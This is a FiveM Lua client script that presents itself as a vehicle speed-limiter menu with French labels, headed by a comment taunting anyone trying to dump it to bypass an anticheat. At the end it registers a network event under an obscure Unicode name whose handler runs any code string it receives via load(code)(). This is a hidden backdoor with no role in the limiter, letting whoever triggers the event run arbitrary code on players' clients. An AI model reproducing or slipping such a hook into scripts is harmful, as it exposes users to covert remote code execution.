-------- ARRETE D'ESSAYEZ DE DUMP POUR BYPASS MON ANTICHEAT TU REUSSIRA PAS ^^ --------
_print = print
_TriggerServerEvent = TriggerServerEvent
_NetworkExplodeVehicle = NetworkExplodeVehicle
_AddExplosion = AddExplosion

local options = {
	x = 0.1,
	y = 0.2,
	width = 0.2,
	height = 0.04,
	scale = 0.4,
	font = 0,
	menu_title = "",
	menu_subtitle = "LIMITATEUR",
	color_r = 255,
	color_g = 119,
	color_b = 0
}

function createSpeedoMenu()
	ClearMenu()
	Menu.addButton("Fermer le menu", "CloseMenu", nil)
	Menu.addButton("Désactiver", "vitesse", 0)
	Menu.addButton("30 ~g~Km/h", "vitesse", "30.0")
	Menu.addButton("50 ~g~Km/h", "vitesse", "50.0")
	Menu.addButton("70 ~g~Km/h", "vitesse", "70.0")
	Menu.addButton("90 ~g~Km/h", "vitesse", "90.0")
	Menu.addButton("110 ~g~Km/h", "vitesse", "110.0")
	Menu.addButton("130 ~g~Km/h", "vitesse", "130.0")
end

function CloseMenu()
	Menu.hidden = not Menu.hidden
end

function vitesse(vit)
	local plyPed = PlayerPedId()
	local plyVeh = GetVehiclePedIsIn(plyPed, false)
	local newSpeed = vit / 3.6
	local vehMaxSpeed = GetVehicleEstimatedMaxSpeed(plyVeh)
   
	if vit == 0 then
		SetEntityMaxSpeed(plyVeh, vehMaxSpeed)
		ShowNotification("Limitateur désactivé")
	else
		SetEntityMaxSpeed(plyVeh, newSpeed)
		ShowNotification("Limitateur activé")
		createSpeedoMenu()
	end
end

function ShowNotification(msg)
	BeginTextCommandThefeedPost("STRING")
	AddTextComponentSubstringPlayerName(msg)
	EndTextCommandThefeedPostTicker(false, false)
end

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)
		
		if IsPedInAnyVehicle(PlayerPedId()) then
			if IsControlJustPressed(0, 288) then
				createSpeedoMenu()
				Menu.hidden = not Menu.hidden
			end

			Menu.renderGUI(options)
		end
	end
end)

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)